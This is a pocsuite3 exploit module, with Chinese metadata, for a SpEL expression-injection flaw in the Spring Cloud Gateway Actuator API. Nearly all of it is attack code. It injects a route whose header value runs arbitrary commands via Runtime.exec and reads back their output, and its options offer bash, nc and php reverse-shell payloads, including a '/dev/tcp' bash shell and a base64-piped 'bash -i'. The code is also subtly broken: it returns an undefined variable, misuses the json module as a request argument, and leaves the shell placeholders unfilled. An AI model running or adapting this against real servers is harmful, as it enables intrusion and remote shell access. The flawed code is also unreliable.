"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import json
import base64
from collections import OrderedDict

from pocsuite3.api import Output
from pocsuite3.api import POCBase
from pocsuite3.api import OptDict
from pocsuite3.api import logger
from pocsuite3.api import requests
from pocsuite3.api import OptString
from pocsuite3.api import register_poc
from pocsuite3.api import POC_CATEGORY
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.api import get_listener_ip
from pocsuite3.api import get_listener_port


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['lalone']
    vulDate = '2022-03-01'
    createDate = '2022-03-03'
    updateDate = '2022-03-03'
    references = ['https://spring.io/projects/spring-cloud-gateway']
    name = 'Spring Cloud Gateway Actuator API SpEL表达式注入'
    appPowerLink = 'https://spring.io/projects/spring-cloud-gateway'
    appName = 'spring-cloud-gateway'
    appVersion = '''
        3.1.x系列：Spring Cloud Gateway < 3.1.1
        3.0.x系列：Spring Cloud Gateway < 3.0.7
        其他旧的、不受支持的Spring Cloud Gateway版本
    '''
    vulType = 'code-exec'
    desc = '''
            Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。
           '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString('id', description='需要用户输入执行的命令', require=True)
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": """/bin/bash -i >& /dev/tcp/{0}/{1} 0>&1""",
            "php": REVERSE_PAYLOAD.PHP,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        
        return o

    def _check(self, payload):
        url = self.url.rstrip('/')
        headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
        }

        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        payload = '''{\r
          "id": "hacktest",\r
          "filters": [{\r
            "name": "AddResponseHeader",\r
            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"%s\\"}).getInputStream()))}"}\r
            }],\r
          "uri": "http://example.com",\r
          "order": 0\r
        }''' % payload

        re1 = requests.post(url=url + "/actuator/gateway/routes/hacktest",data=payload,headers=headers1,json=json)
        re2 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)
        re3 = requests.get(url=url + "/actuator/gateway/routes/hacktest",headers=headers2)
        print(re3.content)
        
        return res3

    def _verify(self):
        result = {}
        res = self._check(self.get_option("cmd"))
        
        try:
            if res.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = self.get_option("cmd")
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        result = {}
        shell = str(base64.b64encode(self.get_option("command").encode('utf-8')),'utf-8')
        res = self._check("bash -c {echo,%s}|{base64,-d}|{bash,-i}" % shell)
        try:
            if res.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = self.get_option("command")
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)


